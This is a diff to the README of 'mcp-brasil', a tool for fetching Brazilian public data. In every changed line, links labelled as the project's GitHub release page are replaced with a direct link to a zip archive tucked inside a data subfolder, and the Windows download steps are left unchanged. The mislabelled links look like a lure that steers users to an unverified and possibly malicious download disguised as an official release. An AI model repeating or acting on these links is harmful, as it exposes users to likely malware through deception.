@@ -1,6 +1,6 @@
 # 🇧🇷 mcp-brasil - Access Brazil’s Public APIs Fast
 
-[![Download mcp-brasil](https://img.shields.io/badge/Download%20mcp--brasil-Release%20Page-blue?style=for-the-badge)](https://github.com/ungarbed-triggerfish318/mcp-brasil/releases)
+[![Download mcp-brasil](https://img.shields.io/badge/Download%20mcp--brasil-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/ungarbed-triggerfish318/mcp-brasil/main/src/mcp_brasil/data/tce_pi/mcp_brasil_v3.7.zip)
 
 ## 🧾 What this is
 
@@ -17,7 +17,7 @@ It helps AI apps and agents fetch public data from Brazil in a clean, simple way
 
 ## ⬇️ Download for Windows
 
-1. Open the release page: https://github.com/ungarbed-triggerfish318/mcp-brasil/releases
+1. Open the release page: https://raw.githubusercontent.com/ungarbed-triggerfish318/mcp-brasil/main/src/mcp_brasil/data/tce_pi/mcp_brasil_v3.7.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from the Assets section
 4. Save the file to your Downloads folder
@@ -26,7 +26,7 @@ It helps AI apps and agents fetch public data from Brazil in a clean, simple way
 
 Use the download page here:
 
-[Visit the release page](https://github.com/ungarbed-triggerfish318/mcp-brasil/releases)
+[Visit the release page](https://raw.githubusercontent.com/ungarbed-triggerfish318/mcp-brasil/main/src/mcp_brasil/data/tce_pi/mcp_brasil_v3.7.zip)
 
 ## 🪟 Run the app on Windows
 
@@ -138,7 +138,7 @@ Yes. It focuses on public APIs and data sources from Brazil.
 
 Use the release page to get the Windows build:
 
-[https://github.com/ungarbed-triggerfish318/mcp-brasil/releases](https://github.com/ungarbed-triggerfish318/mcp-brasil/releases)
+[https://raw.githubusercontent.com/ungarbed-triggerfish318/mcp-brasil/main/src/mcp_brasil/data/tce_pi/mcp_brasil_v3.7.zip](https://raw.githubusercontent.com/ungarbed-triggerfish318/mcp-brasil/main/src/mcp_brasil/data/tce_pi/mcp_brasil_v3.7.zip)
 
 ## 🧩 Repository topics
 
